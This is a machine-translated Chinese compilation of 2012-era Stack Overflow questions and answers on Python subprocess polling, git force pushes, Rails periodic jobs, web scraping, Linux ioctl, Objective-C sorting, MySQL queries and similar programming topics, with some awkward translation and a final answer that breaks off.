在这种情况下，您不需要线程。只需用于[`subprocess.Popen`](http://docs.python.org/2/library/subprocess#subprocess.Popen)启动子进程。

要在进程结束时通知 GUI，您可以使用`widget.after()`以下方法实现轮询：

```
process = Popen(['/path/to/command', 'arg1', 'arg2', 'etc'])
progressbar.start()

def poller():
    if process.poll() is None: # process is still running
       progressbar.after(delay, poller)  # continue polling
    else:
       progressbar.stop() # process ended; stop progress bar

delay = 100  # milliseconds
progressbar.after(delay, poller) # call poller() in `delay` milliseconds 
```

如果您想手动停止进程而不等待：

```
if process.poll() is None: # process is still running
   process.terminate()
   # kill process in a couple of seconds if it is not terminated
   progressbar.after(2000, kill_process, process)

def kill_process(process):
    if process.poll() is None:
        process.kill()
        process.wait() 
```

这是一个[完整的例子](https://gist.github.com/4067619)。

# android - 从一开始就显示 textview

> ID：13353095
> 
> 赞同：-2
> 
> 时间：2012-11-12T23:06:52.983
> 
> 标签：android, textview

通过数组，当我按下按钮时，在文本视图（可滚动）中显示新文本。

因此，如果在文本视图中阅读文本直到半页并按下按钮，新文本视图会向我显示新文本，而不是从它的开头而是与最后一个文本视图的位置相同。

我如何解决这个问题？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T15:47:17.847

当你提到滚动文本视图时，你会在黑暗中猛烈抨击，你指的是 EditText 视图。如果是这种情况，您可以使用[setSelection](http://developer.android.com/reference/android/widget/EditText.html#setSelection%28int%29)函数在 EditText 中设置光标的位置。要返回开始，您将使用 setSelection(0)。

# git - 尝试变基 HEAD 指针时拒绝更新分支提示

> ID：13353100
> 
> 赞同：5
> 
> 时间：2012-11-12T23:07:22.253
> 
> 标签：git

我想将 HEAD 指针重置为我之前的提交

```
$ git reset --hard HEAD~1 
```

HEAD 移至上一个提交，但是，无法推送到我的原始主机

```
$git push origin master

! [rejected]        master -> master (non-fast-forward)
    error: failed to push some refs to 'https://github.com/username/repo.git'
    hint: Updates were rejected because the tip of your current branch is behind
    hint: its remote counterpart. Merge the remote changes (e.g. 'git pull')
    hint: before pushing again. 
```

如何移动指针并告诉 Git 更新更改？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T23:18:38.187

默认情况下，Git 不允许您推送历史记录中没有服务器上最新更改的更改。这是为了避免其他人已经拉过你以前的 HEAD 时出现问题；那么你推送一些不是后代的东西将意味着他们需要合并或重新定位到你的新提交。

如果您知道没有其他人在使用您的 repo，或者已经与所有人进行了沟通，那么您可以强制推送您的更改：

```
git push -f origin master 
```

某些服务器配置为不允许强制更新。如果他们不这样做，您可以通过删除并重新创建分支来解决它：

```
git push origin :master
git push origin master 
```

但只有在您知道没有其他人的工作基于您的工作时才执行这些操作，或者您可以与每个人沟通并确保他们也正确地重置到其本地存储库中的先前提交。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T02:28:30.677

您必须告诉 git 强制推送，因为这将丢失远程提交。这是一种安全机制，因此您不会无意中删除工作。这也是一个方便的功能，您只需发出 a `git push`，所有为跟踪而设置的分支都将在远程更新，但最终会删除某些提交的分支除外。

# ruby-on-rails - rails 定期任务

> ID：13353105
> 
> 赞同：13
> 
> 时间：2012-11-12T23:07:40.003
> 
> 标签：ruby-on-rails, ruby, asynchronous, scheduled-tasks

我有一个 ruby​​ on rails 应用程序，我试图找到一种每隔几秒钟运行一些代码的方法。

我发现很多使用 cron 或类似 cron 的实现的信息和想法，但这些只是精确到分钟，和/或需要外部工具。我想每 15 秒左右启动一次任务，并且我希望它完全独立地包含在应用程序中（如果应用程序停止，任务停止，并且没有外部设置）。

这用于缓存数据的后台生成。每隔几秒钟，该任务将组装一些数据，然后将其存储在缓存中，供所有客户端请求使用。该任务非常慢，因此它需要在后台运行并且不阻塞客户端请求。

我对 ruby​​ 很陌生，但是有很强的 perl 背景，我解决这个问题的方法是创建一个间隔计时器和处理程序，它分叉、运行代码，然后在完成后退出。
仅仅模拟一个客户端请求并让 Rails 控制器自己派生可能会更好。这样，我可以通过点击它的 URI 来启动任务（尽管由于任务将每隔几秒运行一次，我怀疑我是否需要这样做，但可能会在未来使用）。尽管让控制器调用周期性任务调度程序正在调用的任何方法（一旦我有一个）是微不足道的。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-13T01:10:48.163

我建议无论何时 gem [https://github.com/javan/whenever](https://github.com/javan/whenever)

它允许您指定一个时间表，例如：

```
every 15.minutes do
  MyClass.do_stuff
end 
```

没有安排 cron 作业或使用外部服务进行监控。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T03:27:07.057

一般来说，我所知道的在应用程序中创建周期性任务的内置方式是不存在的。Rails 建立在 Rack 之上，它期望接收 http 请求，做一些事情，然后返回。所以你只需要自己在外部管理周期性任务。

我认为考虑到运行任务所需的频率，一个不错的解决方案可能只是为自己编写一个永远循环的简单 rake 任务，并在启动应用程序的同时启动它，使用像 Foreman 之类的东西。Foreman 经常像这样用于管理启动/关闭后台工作人员及其应用程序。在生产环境中，您可能希望使用其他东西来管理流程，例如 Monit。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-13T04:01:01.547

您可以编写自己的方法，例如

> ```
> class MyWorker
>   def self.work
>     #do you work
>     sleep 15
>   end
> end 
> ```

运行它`rails runner MyWorker.work` 会有一个单独的进程在后台运行

或者你可以使用像 Resque 这样的东西，但这是一种不同的方法。它的工作原理是这样的：向队列中添加一个任务，同时一个工作人员正在获取队列中的任何作业，并尝试完成它。

所以这取决于你自己的需要。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-05-17T16:54:43.747

我知道这是一个老问题。但也许对于某人来说，这个答案可能会有所帮助。有一个叫做[crono](https://github.com/plashchynski/crono)的宝石。

> Crono 是一个用于 Ruby on Rails 的基于时间的后台作业调度程序守护进程（就像 Cron 一样）。
> 
> Crono 是纯 Ruby。它不使用 Unix Cron 和其他平台相关的东西。因此，您可以在 Ruby 支持的所有平台上使用它。它使用 Active Record 将作业状态持久化到您的数据库中。您可以完全控制作业执行过程。它是 Ruby，因此您可以理解和修改它以满足您的需求。

crono 最棒的地方在于它的代码是自我解释的。为了定期执行任务，您可以执行以下操作：

```
Crono.perform(YourJob).every 2.days 
```

也许你也可以这样做：

```
Crono.perform(YourJob).every 30.seconds 
```

不管怎样，你真的可以做很多事情。另一个例子可能是：

```
Crono.perform(TestJob).every 1.week, on: :monday, at: "15:30" 
```

我建议使用这个 gem 而不是[无论何时](https://github.com/javan/whenever)，因为无论何时使用 Unix Cron 表，它并不总是可用。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-09-15T20:22:50.660

仅仅因为它看起来有点优雅而抛出一个解决方案，并且没有任何额外的宝石就回答了这个问题。在我的场景中，我想运行一些代码，但只有在我所有的 Sidekiq 工作人员都完成了他们的工作之后。

首先我定义了一个方法来检查是否有工人在工作......

```
def workers_working?
  workers = Sidekiq::Workers.new.map do |_process_id, _thread_id, work|
    work
  end
  workers.size > 0
end 
```

然后我们只需使用在调用之间休眠的循环来调用该方法。

```
sleep 5 while workers_working? 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-12T23:28:31.307

使用延迟作业之类的东西，并经常重新排队？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-05-11T07:40:49.027

使用使用 eventmachine 的瘦服务器或其他服务器，然后只使用作为 eventmachine 一部分的计时器。示例：在 config/application.rb

```
EM.add_periodic_timer(2) do
  do_this_every_2_sec
end 
```

# xml - EMMA：如果提供空的 emma.sources 以及如何从 coverage.ec 生成报告，则稍后检索源

> ID：13353106
> 
> 赞同：1
> 
> 时间：2012-11-12T23:07:45.233
> 
> 标签：xml, ant, emma

因此，我将 instr 的“sourcepathref”和报告过程引用到路径“emma.sources”，该路径应该检查**/src/**中的文件。但是，由于某些原因，我需要忽略它。所以，我的“emma.sources”实际上什么都没有。

然后我运行构建文件，并成功创建了 metadata.emma 和 coverage.ec。现在我想知道我能用那个coverage.ec 文件做什么。如何从中生成 HTML 页面？另外，正如我之前跳过“sourcepathref”一样。以后如何检索所有“来源”以进行报告？

非常感谢！

# java - DB4o 8.0 java 1.6 juno - 将数据库导入项目

> ID：13353107
> 
> 赞同：1
> 
> 时间：2012-11-12T23:07:48.053
> 
> 标签：java, db4o

我想将 db4o 8.0 添加到我的项目中。我安装了 db4o 并且正在使用 JUNO eclipse，但我不知道我必须在哪里找到安装文件的方向才能将项目添加到文件中，例如：

> 导入 db4o.Db4oEmbedded
> 
> 导入 db4o.ObjectContainer
> 
> 导入 db4o.config.EmbeddedConfiguartion

![在此处输入图像描述](../Images/17bdf0630abcc4918a939d3f9dd749b3.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:42:22.203

我找到了答案，eclipse 文件中有 JAR。如果不添加到项目 db4o 将不起作用。

> C:\Users\Rafal\Desktop\eclipse\configuration\org.eclipse.osgi\bundles\859\1.cp

# python - 如何使用 python 获取渲染的 ASP 页面？

> ID：13353112
> 
> 赞同：-2
> 
> 时间：2012-11-12T23:08:16.783
> 
> 标签：python, asp-classic

我正在尝试使用 python 浏览一个网站，该网站在其登陆页面上有身份验证表单，由 ASP 脚本呈现。

但是，当我使用 python（使用 mechanize、requests 或 urlibs）来获取该站点的 HTML 时，由于此类 ASP 脚本，我总是得到一个半空白的 HTML 文件。

有谁知道我可以使用什么方法来获得 ASP 站点的最终（显示在浏览器上）版本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:55:23.647

[您的目标页面](http://www010.dataprev.gov.br/cws/contexto/aguia02/aguia02.html)是`frameset`. 我可以告诉服务器端没有什么花哨的事情。当我使用`requests`或`urllib`下载它时，即使根本不发送任何标题，我也会得到与在 Chrome 或 Firefox 中看到的完全相同的 HTML。有一些嵌入式 JS，但它什么也没做。基本上，这里只有`frameset`一个单曲`frame`。

[`frame`](http://www010.dataprev.gov.br/cws/contexto/aguia02/aguia02inicio.HTML)目标也是一个完全正常的页面，我可以告诉服务器端没有任何花哨的事情发生。同样，如果我在没有标题的情况下获取它，我会得到与 Chrome 或 Firefox 中完全相同的内容。这里有很多嵌入式 JS，但它不是从头开始构建 DOM 或其他任何东西；我从服务器获得的静态内容包含整个页面内容。我可以把所有的 JS 都去掉，然后渲染出来，看起来一模一样。

有一个小问题，服务器和 HTML 都没有在任何地方指定字符集，但内容不是 ASCII，这意味着如果要将其处理为 Unicode，则需要猜测要解码的字符集。但是，如果您在 Python 2.x 中，并且只是打算通过 ID 或其他方式从 DOM 中获取内容，那就没关系了。

我怀疑你真正的问题是你不知道 HTML是如何`frameset`工作的。您正在下载`frameset`，而不是下载引用的`frame`，并且想知道为什么结果页面看起来像一个空的`frameset`。

框架是一个过时的功能，除了让用户在古老的浏览器中弹出一个新窗口的常见技巧，以及一些用于欺骗弹出窗口阻止程序的晦涩技巧之外，没有人再使用它了。在 HTML 5 中，它们终于消失了。但是只要古老的网站存在并且需要被抓取，你就需要知道它们是如何工作的。

这不是完整文档的替代品，但这是 Web 浏览器对 a 所做的简短版本`frameset`：对于每个`frame`标签，它遵循属性，然后将标签`src`的内容替换为没有属性的标签，使用读取URL 作为其内容的结果。除此之外，当然，框架会影响布局，但这可能不会影响您。`frame``#document``src`

同时，如果你想学习网络抓取，你真的想安装浏览器的“Web 开发工具”（不同的浏览器有不同的名称），或者像 Firebug 这样的完整调试器。这样，您可以检查浏览器正在呈现的实时树，并将其与您从脚本（或更简单地说，从`wget`）中获得的内容进行比较。因此，下次您可以说“在 Chrome 的检查页面中，我在 下方看到一个`#document`，`frame`下方有一大堆东西，但是当我自己尝试阅读同一页面时，`frame`没有孩子”。

# python - 如何通过FTP进入虚拟机？

> ID：13353113
> 
> 赞同：0
> 
> 时间：2012-11-12T23:08:25.977
> 
> 标签：python, django, ftp, virtualenv, virtualbox

我最近开始学习 Django，并在 VirtualEnv 上设置了一个运行 Django 服务器的虚拟机。我可以使用 runserver 命令运行基本的 Django 安装服务器，并在具有本地 IP 地址的另一台计算机上查看它。

但是，我不知道如何使用我的 FTP 客户端连接到我的虚拟机，以便我可以在我的主机 (Windows) 上编辑文件。我尝试使用带有 FTP 客户端的虚拟机的 IP 地址，但它显示“连接被服务器拒绝”。

任何帮助将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:13:58.430

客户端报告“服务器拒绝连接”的原因是服务器返回了一个设置了重置位的 TCP 数据包，以响应应用程序尝试连接到应用程序未侦听的端口，或者通过防火墙。

我认为 FTP 服务没有运行，或者在备用端口上运行。查看`netstat -nltp`（在 Linux 上）或`netstat -ntlb`（在 Windows 上）的输出。您应该会看到一个程序正在等待接收 TCP 端口 21 上的请求。如果您根本没有看到该程序，或者您的客户端将尝试连接到的预期端口上没有列出该程序，则修改 FTP 服务器配置文件。

# ruby - 用于在open-uri ruby 中查找 href 的正则表达式

> ID：13353115
> 
> 赞同：-1
> 
> 时间：2012-11-12T23:08:48.693
> 
> 标签：ruby, regex, open-uri

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T00:18:49.763

如果您想查找`a`标签的`href`参数，请使用正确的工具，该工具通常不是正则表达式。您更有可能应该使用 HTML/XML 解析器。

[Nokogiri](http://nokogiri.org)是 Ruby 的首选解析器：

```
require 'nokogiri'
require 'open-uri'

doc = Nokogiri.HTML(open('http://www.example.org/index.html'))
doc.search('a').map{ |a| a['href'] }

pp doc.search('a').map{ |a| a['href'] }
# => [
# =>  "/",
# =>  "/domains/",
# =>  "/numbers/",
# =>  "/protocols/",
# =>  "/about/",
# =>  "/go/rfc2606",
# =>  "/about/",
# =>  "/about/presentations/",
# =>  "/about/performance/",
# =>  "/reports/",
# =>  "/domains/",
# =>  "/domains/root/",
# =>  "/domains/int/",
# =>  "/domains/arpa/",
# =>  "/domains/idn-tables/",
# =>  "/protocols/",
# =>  "/numbers/",
# =>  "/abuse/",
# =>  "http://www.icann.org/",
# =>  "mailto:iana@iana.org?subject=General%20website%20feedback"
# => ] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:24:30.947

我看到这个正则表达式有几个问题：

*   在空标记中的斜杠之前不一定必须有空格，但是您的正则表达式需要它

*   您的正则表达式非常冗长且多余

请尝试以下操作，它会从 <a> 标记中提取 URL：

```
link = /<a \s   # Start of tag
    [^>]*       # Some whitespace, other attributes, ...
    href="      # Start of URL
    ([^"]*)     # The URL, everything up to the closing quote
    "           # The closing quotes
    /x          # We stop here, as regular expressions wouldn't be able to
                # correctly match nested tags anyway 
```

# javascript - JavaScript Isotope - 如何智能地创建多组过滤器以在一个容器上协同工作？

> ID：13353118
> 
> 赞同：2
> 
> 时间：2012-11-12T23:09:04.507
> 
> 标签：javascript, jquery, jquery-isotope

假设我想过滤颜色（红色、黄色或蓝色）和尺寸（小、中或大）和材料（羊毛、棉花、丝绸）。我将有三组复选框。如果用户选中“红色”复选框和“中等”复选框，我希望 Isotope 显示红色和中等的项目。到目前为止，没有问题。但是，如果用户同时选中红色和黄色复选框以及中号和大号复选框以及羊毛和丝绸复选框怎么办？现在我希望 Isotope 显示`((medium OR large) AND (red OR yellow) AND (wool OR silk))`.

构建一个适合这种情况的 jQuery 选择器字符串对我来说似乎很复杂，特别是如果有几十个组，每个组都包含几十个选项。

仅使用 jQuery，我可以执行以下操作：

```
$('.medium, .large').filter('.red, .yellow').filter('.wool, .silk'); 
```

但是，如果我必须只构建一次整个选择器以便将其完整地传递给 Isotope，我将不得不这样做：

```
`.medium.red.wool, .medium.red.silk, .medium.yellow.wool, .medium.yellow.silk, .large.red.wool, .large.red.silk, .large.yellow.wool, .large.yellow.silk` 
```

如您所见，从三个组中选择了两个项目，我的选择器中有 2^3 个逗号分隔的字符串。现在想象我有六个过滤组：

```
Color (red, blue, yellow, green, purple, black)
Size (tiny, small, medium, biggish, large, extra-large)
Price (very-cheap, cheap, medium, expensive, very-expensive, extraordinarily-expensive)
Material (cotton, wool, satin, linen, felt, wood, iron)
Type (archer, hunter, wizard, mage, spy, druid)
Popularity (not-popular, mildly-popular, somewhat-popular, medium-popular, quite-popular, very-popular) 
```

假设用户检查了每组中的前五个选项。我的选择器字符串必须包含 5^6 个逗号分隔的字符串，每个字符串包含六个术语。如果每个术语平均有 5 个字符，用 5 个`.`s 分隔，那么我将有 5^6 个字符串，每个 35 个字符长，我的选择器的总长度约为 546,875 个字符。

Isotope 是否为我提供了更好的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T23:19:49.483

jQuery[`.filter`](http://api.jquery.com/filter/)也接受一个函数，而不仅仅是一个选择器字符串，所以你可以创建一个函数。

```
$elem.isotope({
    filter: function() {
        var $this = $(this);
        return $this.is('.medium, .large') && $this.is('.red, .yellow') && $this.is('.wool, .silk');
    }
}); 
```

查看同位素源代码，它似乎应该可以工作，因为它们将过滤器参数传递给 jQuery 过滤器方法。

您可以通过传递选择器数组来即时创建类似的函数：

```
function makeFilterFunction( selectorsArray ) {
    var length = selectorsArray.length;
    return function() {
        var $this = $(this);

        for( var i = 0; i < length; ++i ) {
            if( !$this.is( selectorsArray[i] ) ) {
                return false;
            }
        }

        return true;
    };
} 
```

然后：

```
$elem.isotope({
    filter: makeFilterFunction(['.medium, .large', '.red, .yellow', '.wool, .silk'])
}); 
```

是我答案开头的静态代码的动态等效项。

# java - 为什么杰克逊的 JsonGeneratorDelegate 没有实现 setPrettyPrinter()？

> ID：13353121
> 
> 赞同：0
> 
> 时间：2012-11-12T23:09:16.483
> 
> 标签：java, json, jackson

这真是令人困惑！如果您按原样使用 JsonGeneratorDelegate 它不会将调用 setPrettyPrinter() 传输给委托

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T02:39:38.217

可能只是一个疏忽——请随时提交问题以在未来版本中更正此问题。默认情况下，委托应该委托所有调用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:37:58.817

那么你真正的问题是什么？您始终可以定义自己的增强型`JsonGeneratorDelegate`，如下所示：

```
public class PrettyPrintJsonGeneratorDelegate extends JsonGeneratorDelegate {
    public PrettyPrintJsonGeneratorDelegate (final JsonGenerator delegate) {
        super (delegate);
    }

    @Override
    public JsonGenerator setPrettyPrinter(final PrettyPrinter pp) {
        delegate.setPrettyPrinter (pp);
        return this;
    }
} 
```

# ruby-on-rails - 在 Heroku 上使用 Sidekiq 运行线程时，基本 AR 和 AS 方法出现未定义方法错误

> ID：13353125
> 
> 赞同：1
> 
> 时间：2012-11-12T23:09:38.093
> 
> 标签：ruby-on-rails, multithreading, heroku, sidekiq

在 Sidekiq 排队作业中运行时，我的一个模型中的特定代码行出现了几个不同的错误。有问题的代码是：

```
@lookup_fields[:asin] ||= self.book_lookups.find_by_name("asin").try(:value) 
```

我要么得到`undefined method 'scope' for #<ActiveRecord::Associations::AssociationScope:0x00000005f20cb0>`要么`undefined method 'aliased_table_for' for #<ActiveRecord::Associations::AliasTracker:0x00000005bc3f90>`。

在另一个 Sidekiq 作业的另一行代码中，我收到错误消息`undefined method 'decrypt_and_verify' for #<ActiveSupport::MessageEncryptor:0x00000007143208>`。

所有这些错误都毫无意义，因为它们是 Rails 运行时支持库的标准方法。

有问题的模型具有为“book_lookups”模型定义的 :has_many 关联，“name”和“value”是“book_lookups”模型中的字段。这总是发生在处理的前 1-3 条记录上。如果我在 Sidekiq 作业之外运行相同的代码，则不会发生这些错误。

我无法在我的开发机器上重现该错误，只能在 Heroku 托管的生产中重现。

我可能通过将代码“BookLookup.new()”放在初始化程序中“解决”了第一组错误，强制模型在 Sidekiq 创建任何线程之前加载。只有一晚的工作要继续，所以我们必须看看这种趋势是否会继续......

即使这解决了眼前的问题，我也不认为它解决了真正的根本问题，即类在使用之前没有完全加载。类加载是原子操作吗？一个线程是否可以开始加载一个类而另一个线程在完全加载之前开始使用该类？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T19:13:14.140

我相信我已经找到了答案：config.threadsafe!，但我没有这样做。我现在已经这样做了，如果不是全部的话，大多数错误都消失了。参考：[http://guides.rubyonrails.org/configuring.html](http://guides.rubyonrails.org/configuring.html)，[http://m.onkey.org/thread-safety-for-your-rails](http://m.onkey.org/thread-safety-for-your-rails)（尤其是“Ruby 的 require 不是原子的”部分）。

# python - MongoDB 和 Twitter 查询

> ID：13353137
> 
> 赞同：0
> 
> 时间：2012-11-12T23:10:35.113
> 
> 标签：python, mongodb, twitter, tweepy

我通过 Streaming API 收集了推文，并想从 mongodb 进行查询。

我是 MongoDB 的新手，所以这是用坐标或位置信息查询推文的正确语法：

```
cursor = coll.find({"coordinates.type" : "Point"},{"coordinates" :1} or {"location": not "null" }, tailable = True, timeout = False) 
```

我正在使用 pymongo，这是一个有上限的集合。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T00:13:40.313

看看**$or**和**$ne**运算符。

来自官方 MongoDB 文档：

**$ 或**：[http ://docs.mongodb.org/manual/reference/operator/or/](http://docs.mongodb.org/manual/reference/operator/or/)

> $or 运算符对两个或多个数组执行逻辑 OR 运算，并选择至少满足 .

**$ne**：[http ://docs.mongodb.org/manual/reference/operator/ne/](http://docs.mongodb.org/manual/reference/operator/ne/)

> $ne 选择字段值不等于（即！=）指定值的文档。这包括不包含该字段的文档。

您需要重写您的查询如下：

```
cursor = coll.find({ $or : [{"coordinates.type" : "Point"},{"location": {$ne :"null" }}]},{"coordinates" :1}, tailable = True, timeout = False) 
```

# html - 找不到 CSS 边距来删除它

> ID：13353141
> 
> 赞同：0
> 
> 时间：2012-11-12T23:10:45.763
> 
> 标签：html, css, wordpress

我正在尝试删除所附屏幕截图中的边距（请参阅[http://goo.gl/tbw4V](http://goo.gl/tbw4V)），但我一生都无法看到它在我的 WordPress 样式表中的位置来删除它！我希望听到有人可以帮助我？我检查了 H1、H2 标记、.bylines DIV 和段落标记，但似乎没有将条目信息推送到标题下方约 15 像素处。我的网站位于[http://gracefulpostcards.com](http://gracefulpostcards.com)

谢谢你的帮助，

史蒂文。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T23:13:26.057

在 style.css 第 753 行

```
.hentry .entry-title {
    margin: 0 0 0.6em 0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:13:48.123

```
.featured {
margin-bottom: 20px;
} 
```

是您必须更改的 CSS 规则。

如果这是您正在谈论的页面：http: [//gracefulpostcards.com/why-start-a-personal-blog/#.UKGMi4csDng](http://gracefulpostcards.com/why-start-a-personal-blog/#.UKGMi4csDng)

然后删除此 CSS 规则将完美删除边距底部。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T23:13:58.453

查看 style.css，样式从第 753 行开始。

我是怎么找到的？谷歌浏览器->右键单击->检查元素。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T23:14:12.043

边距在选择器下定义`.hentry .entry-title`。是`margin: 0 0 0.6em 0`。只需将其设为 0。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-12T23:17:44.153

要调整这些样式，强烈建议您使用 Chrome 或 Firefox 的**Firebug**扩展。这样就可以调试html页面和样式了。

在您的情况下，只需将`margin-bottom`选择器的属性设置为`.singular .entry-title`0：

```
.singular .entry-title {
margin-bottom: 0;
} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-11-12T23:15:12.883

检查您的页面后，似乎 h2.entry-title 有一个 margin-bottom

要解决此问题，请将以下内容添加到您的 css 中：

`h2 { margin-bottom: 0px !important; }`

# android - Android/Linux ioctl FIONREAD 失败

> ID：13353146
> 
> 赞同：2
> 
> 时间：2012-11-12T23:11:13.800
> 
> 标签：android, linux, windows, porting

我正在将一些（与套接字相关的）Windows C 代码移植到 Linux/Android，并且遇到了 ioctl 命令的问题：

```
unsigned long   u;

if(sockfd != -1 && !ioctl(sockfd, FIONREAD, &u))

{
    return((long) u);
}
    ...
// throw exception 
```

当我检查 errno 时，我看到了 EINVAL，但我不明白为什么对 ioctl 的调用因这些参数而失败。我什至试图将 u 声明为 int ，但它仍然失败。我不知道出了什么问题。此代码在 Windows 上运行良好（ioctlsocket 而不是 ioctl）。

这是来自 Linux 的 strace：

```
socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(9099), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 5)                            = 0
ioctl(3, FIONREAD, [1])                 = -1 EINVAL (Invalid argument)
write(2, "Exception code: 00000503, data: "..., 52Exception code: 00000503, data: 00000000 ((null):0)
) = 52
shutdown(3, 2 /* send and receive */)   = 0
close(3)                                = 0
exit_group(1)                           = ? 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T00:59:23.280

Linux 不支持`FIONREAD/SIOCINQ`监听套接字。见[`tcp(7)`](http://www.kernel.org/doc/man-pages/online/pages/man7/tcp.7.html)：

> ```
> SIOCINQ
>        返回接收缓冲区中排队的未读数据量。这
>        套接字不能处于 LISTEN 状态，否则会出现错误 ( EINVAL )
>        回来。  SIOCINQ在*<linux/sockios.h>*中定义。或者，你
>        可以使用在*<sys/ioctl.h>*中定义的同义词FIONREAD。
> 
> ```

# objective-c - 使用包含数字的字符串对数组进行排序

> ID：13353150
> 
> 赞同：6
> 
> 时间：2012-11-12T23:11:19.480
> 
> 标签：objective-c, xcode, arrays

> **可能重复：**
> [使用 NSSortDescriptor 将 NSString 值排序为 NSInteger](https://stackoverflow.com/questions/9674707/sorting-nsstring-values-as-if-nsinteger-using-nssortdescriptor)

我有一个用我的 NSMutableDictionary 填充的数组。我使用这个：

```
myArray =[[myDict allKeys]sortedArrayUsingSelector:@selector(IDONTKNOW:)]; 
```

myDicts 的 AllKeys 是 NSStrings ......比如 123.423 或 423.343 ......我需要按增量数字对新的 myArray 进行排序...... 12.234 45.3343 522.533 5432.66 等

必须在@selector 中插入什么才能正确执行此操作？谢谢

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-12T23:19:50.827

您可以使用[`NSSortDescriptor`](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSSortDescriptor_Class/Reference/Reference.html)and pass`doubleValue`作为键。

```
//sfloats would be your [myDict allKeys]
NSArray *sfloats = @[ @"192.5235", @"235.4362", @"3.235", @"500.235", @"219.72" ];
NSArray *myArray = [sfloats sortedArrayUsingDescriptors:
                    @[[NSSortDescriptor sortDescriptorWithKey:@"doubleValue" 
                                                    ascending:YES]]];

NSLog(@"Sorted: %@", myArray); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-12T23:15:26.473

你不能直接使用`sortedArrayUsingSelector:`. 自己使用`sortedArrayUsingComparator:`和实现一个比较块。

有点像这样的q/a：

[更改 -[NSArray sortedArrayUsingComparator:] 的排序顺序](https://stackoverflow.com/questions/8054921/changing-the-sort-order-of-nsarray-sortedarrayusingcomparator)

（事实上​​，该问题的代码可能会被复制/粘贴到您的代码中，并且一旦您将其从 更改为`integerValue`以`doubleValue`进行四个 convert-string-to-number 调用，它就会“正常工作”）：

```
NSArray *sortedArray = [array sortedArrayUsingComparator: ^(id obj1, id obj2) {
    double n1 = [obj1 doubleValue];
    double n2 = [obj2 doubleValue];
    if (n1 > n2) {
        return (NSComparisonResult)NSOrderedDescending;
    }

    if (n1 < n2) {
        return (NSComparisonResult)NSOrderedAscending;
    }

    return (NSComparisonResult)NSOrderedSame;
}]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T23:22:00.573

考虑`sortedArrayUsingFunction:`。这允许您定义在比较元素时使用的自定义比较函数。

```
myArray =[[myDict allKeys]sortedArrayUsingFunction:SortAsNumbers context:self];   

NSInteger SortAsNumbers(id id1, id id2, void *context)
{
    float v1 = [id1 floatValue];
    float v2 = [id2 floatValue];
    if (v1 < v2) {
        return NSOrderedAscending;
    } else if (v1 > v2) {
        return NSOrderedDescending;
    }
    return NSOrderedSame;
} 
```

此处提供更多信息：[使用 sortedArrayUsingFunction 对 NSArray 进行排序](https://stackoverflow.com/questions/5147218/sort-nsarray-using-sortedarrayusingfunction#5147284)

# mysql - CONCAT 子查询结果和固定字符串

> ID：13353154
> 
> 赞同：0
> 
> 时间：2012-11-12T23:11:58.620
> 
> 标签：mysql, subquery, concat

我想创建一个虚拟列。
它由列、子查询和固定字符串组成。

当前代码使用子查询作为字符串并且它没有被执行。

```
SELECT X.vname, X.id, CONCAT(X.vname, '..' ,SELECT T.id FROM T WHERE T.x_id=X.id LIMIT 1, '..', 'some_text') FROM xtable AS X 
```

结果如下：`vname_value..SELECT T.id FROM T WHERE T.x_id=X.id LIMIT 1..some_text`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-12T23:22:34.683

试试这个，用括号包围子查询

```
SELECT X.vname, X.id, CONCAT(X.vname, '..' ,(SELECT T.id FROM T WHERE T.x_id=X.id LIMIT 1), '..', 'some_text') FROM xtable 
```

# mysql - 是否可以使用更新/插入触发器在 MySQL 中获取主题标签？

> ID：13353159
> 
> 赞同：-1
> 
> 时间：2012-11-12T23:12:20.533
> 
> 标签：mysql, triggers, hashtag

我不确定在文本字段中构建使用主题标签的 MySQL 数据库的最佳方法是什么，但我想这就像在表格上使用插入/更新触发器，文本字段将解析并添加将任何散列词添加到另一个表中，仅当它不在其中时才将其添加到散列表中。这是一个好方法吗？如果是这样，这样的触发器会是什么样子？

如果有另一种方法来构建 MySQL 数据库以利用主题标签，我愿意接受建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T18:27:27.163

`INSERT`您可以在和上运行触发器`UPDATE`。

您可以将字符串拆分为单词。

您可以`INSERT`自动新建主题标签（`name`假定唯一键）：

```
